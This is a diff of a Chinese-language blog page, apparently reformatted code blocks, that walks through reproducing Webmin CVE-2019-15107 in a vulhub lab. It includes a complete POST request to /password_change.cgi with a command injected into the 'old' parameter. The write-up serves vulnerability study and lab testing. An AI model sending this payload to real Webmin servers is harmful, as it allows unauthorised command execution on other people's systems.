@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya0z0006s04zg2ha14h0" class="article article-type-post" itemscope
+    <article id="post-ckwrjlyft0006ys4zadu320cs" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -179,21 +179,57 @@
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
             <h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>Webmin的是一个用于管理类Unix的系统的管理配置工具，具有网络页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。它已知在端口10000上运行。在重置密码功能中发现了一个错误，该错误允许恶意第三方由于缺少输入验证而执行恶意代码。<span id="more"></span>影响版本为Webmin&lt;=1.920。</p>
 <h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>下载vulhub、编译运行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download project</span></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"><span class="built_in">cd</span> vulhub-master</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enter the directory of vulnerability/environment</span></span><br><span class="line"><span class="built_in">cd</span> flask/ssti</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compile environment</span></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run environment</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-comment"># Download project</span>
+wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
+unzip vulhub-master.zip
+<span class="hljs-built_in">cd</span> vulhub-master
+
+<span class="hljs-comment"># Enter the directory of vulnerability/environment</span>
+<span class="hljs-built_in">cd</span> flask/ssti
+
+<span class="hljs-comment"># Compile environment</span>
+docker-compose build
+
+<span class="hljs-comment"># Run environment</span>
+docker-compose up -d</code></pre>
 <p>其中在<code>docker-compose up -d</code>的时候速度太慢，需使用阿里云镜像加速，配置如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mkdir -p /etc/docker</span></span><br><span class="line">[root@localhost ~]<span class="comment"># tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://9cpn8tt6.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl daemon-reload</span></span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl restart docker</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># mkdir -p /etc/docker</span>
+[root@localhost ~]<span class="hljs-comment"># tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span>
+&#123;
+  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://9cpn8tt6.mirror.aliyuncs.com&quot;</span>]
+&#125;
+EOF
+[root@localhost ~]<span class="hljs-comment"># systemctl daemon-reload</span>
+[root@localhost ~]<span class="hljs-comment"># systemctl restart docker</span></code></pre>
 <p>进入漏洞环境目录：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub-master/webmin/CVE-2019-15107</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /vulhub-master/webmin/CVE-2019-15107</code></pre>
 <p>启动环境：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">sudo docker-compose up -d</code></pre>
 <p>访问地址：https://搭建环境所在机器ip地址:10000/<br><img src="https://img-blog.csdnimg.cn/20201113094745940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>由于存在漏洞目录在<code>/password_change.cgi</code>，而Webmin存在referer安全检测，所以访问如下：<br><img src="https://img-blog.csdnimg.cn/20201113095122448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>按照提示修改配置文件，将1改为0,进入docker:<code>sudo docker exec -it cve201915107_web_1  /bin/bash</code>。<br><img src="https://img-blog.csdnimg.cn/20201113095300696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="三、POC测试"><a href="#三、POC测试" class="headerlink" title="三、POC测试"></a>三、POC测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /password_change.cgi HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.43</span><span class="number">.180</span>:<span class="number">10000</span></span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">86.0</span><span class="number">.4240</span><span class="number">.193</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?<span class="number">1</span></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: redirect=<span class="number">1</span>; testing=<span class="number">1</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">56</span></span><br><span class="line"></span><br><span class="line">user=rootasd&amp;pam=&amp;expired=<span class="number">2</span>&amp;old=<span class="built_in">id</span>&amp;new1=test2&amp;new2=test2</span><br></pre></td></tr></table></figure>
+<h2 id="三、POC测试"><a href="#三、POC测试" class="headerlink" title="三、POC测试"></a>三、POC测试</h2><pre><code class="hljs python">POST /password_change.cgi HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.180</span>:<span class="hljs-number">10000</span>
+Connection: close
+Cache-Control: <span class="hljs-built_in">max</span>-age=<span class="hljs-number">0</span>
+Upgrade-Insecure-Requests: <span class="hljs-number">1</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">86.0</span><span class="hljs-number">.4240</span><span class="hljs-number">.193</span> Safari/<span class="hljs-number">537.36</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span>
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?<span class="hljs-number">1</span>
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span>
+Cookie: redirect=<span class="hljs-number">1</span>; testing=<span class="hljs-number">1</span>
+Content-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded
+Content-Length: <span class="hljs-number">56</span>
+
+user=rootasd&amp;pam=&amp;expired=<span class="hljs-number">2</span>&amp;old=<span class="hljs-built_in">id</span>&amp;new1=test2&amp;new2=test2</code></pre>
 <p>注意：user不能为root用户，自己随便编，old为执行的命令。<br><img src="https://img-blog.csdnimg.cn/20201113095606727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <h2 id="四、原理浅析"><a href="#四、原理浅析" class="headerlink" title="四、原理浅析"></a>四、原理浅析</h2><p>该漏洞形成的主要原因是在于执行qx/…/，代码如下<br><img src="https://img-blog.csdnimg.cn/20201113100038152.png#pic_center" alt="在这里插入图片描述"><br>在perl中的用法，qx/…/相当于php的``,可以直接执行命令的。</p>
 <p>复测下来感觉还是很鸡肋，首先得修改配置文件才能利用该漏洞，也就是说得管理员忘了Webmin的密码，他修改了配置文件<code>/etc/webmin/config </code>之后，<code>/password_change.cgi</code>能访问才能利用。</p>
 <p><strong>小拓展：</strong></p>
 <p>修改webmin密码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/webmin/changepass.pl /etc/webmin/ root root</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">/usr/share/webmin/changepass.pl /etc/webmin/ root root</code></pre>
 <p>详情参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhouhbing/p/4234131.html">https://www.cnblogs.com/zhouhbing/p/4234131.html</a></p>
 
         </div>
